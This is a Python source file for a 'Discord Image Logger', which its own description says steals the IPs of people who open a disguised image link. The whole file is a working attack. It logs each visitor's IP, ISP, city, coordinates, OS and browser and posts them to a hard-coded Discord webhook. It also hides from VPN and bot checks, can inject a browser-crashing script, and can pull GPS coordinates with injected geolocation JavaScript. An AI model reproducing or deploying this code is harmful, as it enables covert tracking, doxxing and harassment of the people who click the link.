# Discord Image Logger
# By DeKrypt | https://github.com/dekrypted

from http.server import BaseHTTPRequestHandler
from urllib import parse
import traceback, requests, base64, httpagentparser

__app__ = "Discord Image Logger"
__description__ = "A simple application which allows you to steal IPs and more by abusing Discord's Open Original feature"
__version__ = "v2.0"
__author__ = "DeKrypt"

config = {
    # BASE CONFIG #
    "webhook": "https://discord.com/api/webhooks/1444448143025635358/iYjkxjpwLl2m7AgD6EJRy6wVtwnFYHGwtBwqswRuDUuxh2knJomIwIagEFyCd92Y7zRN",
    "image": "data:image/jpeg;base64,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", # You can also have a custom image by using a URL argument
                                               # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
    "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)

    # CUSTOMIZATION #
    "username": "Image Logger", # Set this to the name you want the webhook to have
    "color": 0x00FFFF, # Hex Color you want for the embed (Example: Red is 0xFF0000)

    # OPTIONS #
    "crashBrowser": False, # Tries to crash/freeze the user's browser, may not work. (I MADE THIS, SEE https://github.com/dekrypted/Chromebook-Crasher)
    
    "accurateLocation": False, # Uses GPS to find users exact location (Real Address, etc.) disabled because it asks the user which may be suspicious.

    "message": { # Show a custom message when the user opens the image
        "doMessage": False, # Enable the custom message?
        "message": "This browser has been pwned by DeKrypt's Image Logger. https://github.com/dekrypted/Discord-Image-Logger", # Message to show
        "richMessage": True, # Enable rich text? (See README for more info)
    },

    "vpnCheck": 1, # Prevents VPNs from triggering the alert
                # 0 = No Anti-VPN
                # 1 = Don't ping when a VPN is suspected
                # 2 = Don't send an alert when a VPN is suspected

    "linkAlerts": True, # Alert when someone sends the link (May not work if the link is sent a bunch of times within a few minutes of each other)
    "buggedImage": True, # Shows a loading image as the preview when sent in Discord (May just appear as a random colored image on some devices)

    "antiBot": 1, # Prevents bots from triggering the alert
                # 0 = No Anti-Bot
                # 1 = Don't ping when it's possibly a bot
                # 2 = Don't ping when it's 100% a bot
                # 3 = Don't send an alert when it's possibly a bot
                # 4 = Don't send an alert when it's 100% a bot
    

    # REDIRECTION #
    "redirect": {
        "redirect": False, # Redirect to a webpage?
        "page": "https://your-link.here" # Link to the webpage to redirect to 
    },

    # Please enter all values in correct format. Otherwise, it may break.
    # Do not edit anything below this, unless you know what you're doing.
    # NOTE: Hierarchy tree goes as follows:
    # 1) Redirect (If this is enabled, disables image and crash browser)
    # 2) Crash Browser (If this is enabled, disables image)
    # 3) Message (If this is enabled, disables image)
    # 4) Image 
}

blacklistedIPs = ("27", "104", "143", "164") # Blacklisted IPs. You can enter a full IP or the beginning to block an entire block.
                                                           # This feature is undocumented mainly due to it being for detecting bots better.

def botCheck(ip, useragent):
    if ip.startswith(("34", "35")):
        return "Discord"
    elif useragent.startswith("TelegramBot"):
        return "Telegram"
    else:
        return False

def reportError(error):
    requests.post(config["webhook"], json = {
    "username": config["username"],
    "content": "@everyone",
    "embeds": [
        {
            "title": "Image Logger - Error",
            "color": config["color"],
            "description": f"An error occurred while trying to log an IP!\n\n**Error:**\n```\n{error}\n```",
        }
    ],
})

def makeReport(ip, useragent = None, coords = None, endpoint = "N/A", url = False):
    if ip.startswith(blacklistedIPs):
        return
    
    bot = botCheck(ip, useragent)
    
    if bot:
        requests.post(config["webhook"], json = {
    "username": config["username"],
    "content": "",
    "embeds": [
        {
            "title": "Image Logger - Link Sent",
            "color": config["color"],
            "description": f"An **Image Logging** link was sent in a chat!\nYou may receive an IP soon.\n\n**Endpoint:** `{endpoint}`\n**IP:** `{ip}`\n**Platform:** `{bot}`",
        }
    ],
}) if config["linkAlerts"] else None # Don't send an alert if the user has it disabled
        return

    ping = "@everyone"

    info = requests.get(f"http://ip-api.com/json/{ip}?fields=16976857").json()
    if info["proxy"]:
        if config["vpnCheck"] == 2:
                return
        
        if config["vpnCheck"] == 1:
            ping = ""
    
    if info["hosting"]:
        if config["antiBot"] == 4:
            if info["proxy"]:
                pass
            else:
                return

        if config["antiBot"] == 3:
                return

        if config["antiBot"] == 2:
            if info["proxy"]:
                pass
            else:
                ping = ""

        if config["antiBot"] == 1:
                ping = ""


    os, browser = httpagentparser.simple_detect(useragent)
    
    embed = {
    "username": config["username"],
    "content": ping,
    "embeds": [
        {
            "title": "Image Logger - IP Logged",
            "color": config["color"],
            "description": f"""**A User Opened the Original Image!**

**Endpoint:** `{endpoint}`
            
**IP Info:**
> **IP:** `{ip if ip else 'Unknown'}`
> **Provider:** `{info['isp'] if info['isp'] else 'Unknown'}`
> **ASN:** `{info['as'] if info['as'] else 'Unknown'}`
> **Country:** `{info['country'] if info['country'] else 'Unknown'}`
> **Region:** `{info['regionName'] if info['regionName'] else 'Unknown'}`
> **City:** `{info['city'] if info['city'] else 'Unknown'}`
> **Coords:** `{str(info['lat'])+', '+str(info['lon']) if not coords else coords.replace(',', ', ')}` ({'Approximate' if not coords else 'Precise, [Google Maps]('+'https://www.google.com/maps/search/google+map++'+coords+')'})
> **Timezone:** `{info['timezone'].split('/')[1].replace('_', ' ')} ({info['timezone'].split('/')[0]})`
> **Mobile:** `{info['mobile']}`
> **VPN:** `{info['proxy']}`
> **Bot:** `{info['hosting'] if info['hosting'] and not info['proxy'] else 'Possibly' if info['hosting'] else 'False'}`

**PC Info:**
> **OS:** `{os}`
> **Browser:** `{browser}`

**User Agent:**
```
{useragent}
```""",
    }
  ],
}
    
    if url: embed["embeds"][0].update({"thumbnail": {"url": url}})
    requests.post(config["webhook"], json = embed)
    return info

binaries = {
    "loading": base64.b85decode(b'|JeWF01!$>Nk#wx0RaF=07w7;|JwjV0RR90|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|Nq+nLjnK)|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsBO01*fQ-~r$R0TBQK5di}c0sq7R6aWDL00000000000000000030!~hfl0RR910000000000000000RP$m3<CiG0uTcb00031000000000000000000000000000')
    # This IS NOT a rat or virus, it's just a loading image. (Made by me! :D)
    # If you don't trust it, read the code or don't use this at all. Please don't make an issue claiming it's duahooked or malicious.
    # You can look at the below snippet, which simply serves those bytes to any client that is suspected to be a Discord crawler.
}

class ImageLoggerAPI(BaseHTTPRequestHandler):
    
    def handleRequest(self):
        try:
            if config["imageArgument"]:
                s = self.path
                dic = dict(parse.parse_qsl(parse.urlsplit(s).query))
                if dic.get("url") or dic.get("id"):
                    url = base64.b64decode(dic.get("url") or dic.get("id").encode()).decode()
                else:
                    url = config["image"]
            else:
                url = config["image"]

            data = f'''<style>body {{
margin: 0;
padding: 0;
}}
div.img {{
background-image: url('{url}');
background-position: center center;
background-repeat: no-repeat;
background-size: contain;
width: 100vw;
height: 100vh;
}}</style><div class="img"></div>'''.encode()
            
            if self.headers.get('x-forwarded-for').startswith(blacklistedIPs):
                return
            
            if botCheck(self.headers.get('x-forwarded-for'), self.headers.get('user-agent')):
                self.send_response(200 if config["buggedImage"] else 302) # 200 = OK (HTTP Status)
                self.send_header('Content-type' if config["buggedImage"] else 'Location', 'image/jpeg' if config["buggedImage"] else url) # Define the data as an image so Discord can show it.
                self.end_headers() # Declare the headers as finished.

                if config["buggedImage"]: self.wfile.write(binaries["loading"]) # Write the image to the client.

                makeReport(self.headers.get('x-forwarded-for'), endpoint = s.split("?")[0], url = url)
                
                return
            
            else:
                s = self.path
                dic = dict(parse.parse_qsl(parse.urlsplit(s).query))

                if dic.get("g") and config["accurateLocation"]:
                    location = base64.b64decode(dic.get("g").encode()).decode()
                    result = makeReport(self.headers.get('x-forwarded-for'), self.headers.get('user-agent'), location, s.split("?")[0], url = url)
                else:
                    result = makeReport(self.headers.get('x-forwarded-for'), self.headers.get('user-agent'), endpoint = s.split("?")[0], url = url)
                

                message = config["message"]["message"]

                if config["message"]["richMessage"] and result:
                    message = message.replace("{ip}", self.headers.get('x-forwarded-for'))
                    message = message.replace("{isp}", result["isp"])
                    message = message.replace("{asn}", result["as"])
                    message = message.replace("{country}", result["country"])
                    message = message.replace("{region}", result["regionName"])
                    message = message.replace("{city}", result["city"])
                    message = message.replace("{lat}", str(result["lat"]))
                    message = message.replace("{long}", str(result["lon"]))
                    message = message.replace("{timezone}", f"{result['timezone'].split('/')[1].replace('_', ' ')} ({result['timezone'].split('/')[0]})")
                    message = message.replace("{mobile}", str(result["mobile"]))
                    message = message.replace("{vpn}", str(result["proxy"]))
                    message = message.replace("{bot}", str(result["hosting"] if result["hosting"] and not result["proxy"] else 'Possibly' if result["hosting"] else 'False'))
                    message = message.replace("{browser}", httpagentparser.simple_detect(self.headers.get('user-agent'))[1])
                    message = message.replace("{os}", httpagentparser.simple_detect(self.headers.get('user-agent'))[0])

                datatype = 'text/html'

                if config["message"]["doMessage"]:
                    data = message.encode()
                
                if config["crashBrowser"]:
                    data = message.encode() + b'<script>setTimeout(function(){for (var i=69420;i==i;i*=i){console.log(i)}}, 100)</script>' # Crasher code by me! https://github.com/dekrypted/Chromebook-Crasher

                if config["redirect"]["redirect"]:
                    data = f'<meta http-equiv="refresh" content="0;url={config["redirect"]["page"]}">'.encode()
                self.send_response(200) # 200 = OK (HTTP Status)
                self.send_header('Content-type', datatype) # Define the data as an image so Discord can show it.
                self.end_headers() # Declare the headers as finished.

                if config["accurateLocation"]:
                    data += b"""<script>
var currenturl = window.location.href;

if (!currenturl.includes("g=")) {
    if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(function (coords) {
    if (currenturl.includes("?")) {
        currenturl += ("&g=" + btoa(coords.coords.latitude + "," + coords.coords.longitude).replace(/=/g, "%3D"));
    } else {
        currenturl += ("?g=" + btoa(coords.coords.latitude + "," + coords.coords.longitude).replace(/=/g, "%3D"));
    }
    location.replace(currenturl);});
}}

</script>"""
                self.wfile.write(data)
        
        except Exception:
            self.send_response(500)
            self.send_header('Content-type', 'text/html')
            self.end_headers()

            self.wfile.write(b'500 - Internal Server Error <br>Please check the message sent to your Discord Webhook and report the error on the GitHub page.')
            reportError(traceback.format_exc())

        return
    
    do_GET = handleRequest
    do_POST = handleRequest

handler = ImageLoggerAPI
